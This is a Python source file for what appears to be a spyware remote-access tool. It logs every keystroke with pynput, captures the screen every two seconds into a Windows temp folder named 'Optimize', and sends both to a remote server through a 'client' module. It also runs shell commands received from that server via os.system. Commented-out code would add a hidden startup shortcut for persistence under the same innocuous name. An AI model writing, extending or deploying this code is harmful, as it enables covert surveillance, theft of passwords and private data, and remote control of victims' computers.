import os
import pyautogui
from threading import Thread
import struct
from pynput import keyboard
import time
os.makedirs(r"C:\Windows\Temp\Optimize", exist_ok=True)
import client

def on_press(key):
    try:
        print(f'Key pressed: {key.char}')
        client.senda(b"key," + str(key).encode("utf-8"))
    except AttributeError:
        print(f'Special key pressed: {key}')
        client.senda(b"key," + str(key).encode("utf-8"))

def on_release(key):
    pass

# shell = Dispatch('WScript.Shell')

# if getattr(sys, 'frozen', False):
#     script_path = sys.executable
# else:
#     # Running as script
#     script_path = os.path.abspath(__file__)
# script_dir = os.path.dirname(script_path)
# # Create shortcut on desktop
# shortcut_path = os.path.join(winshell.startup(), "Optimize.lnk")
# shortcut = shell.CreateShortCut(shortcut_path)
# # Use pythonw to keep it hidden
# shortcut.Targetpath = script_path
# shortcut.Arguments = ""
# shortcut.WorkingDirectory = script_dir
# shortcut.save()
def listen():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
def take_screenshot():
    while True:
        path = r"C:\Windows\Temp\Optimize\temp.jpg"
        print("Taking screenshot...")
        pyautogui.screenshot(path)
        with open(path, "rb") as f:
            data = f.read()
        client.senda(b"img," + struct.pack("!I", len(data)) + data)
        time.sleep(2)
def receive_commands():
    while True:
        try:
            time.sleep(1)

            data = client.recv()
            if not data or "commands" not in data:
                continue

            commands = list(data["commands"])
            new_commands = []

            for command in commands:
                if command.startswith("cmd "):
                    output = os.system(command[4:])
                    client.sendall(output.encode())
                    print(output)
                else:
                    new_commands.append(command)

            client.update(new_commands)

        except Exception as e:
            print("Error receiving:", e)
            break
Thread(target=take_screenshot, daemon=True).start()
Thread(target=receive_commands, daemon=True).start()
Thread(target=listen, daemon=True).start()
while True:
    time.sleep(1)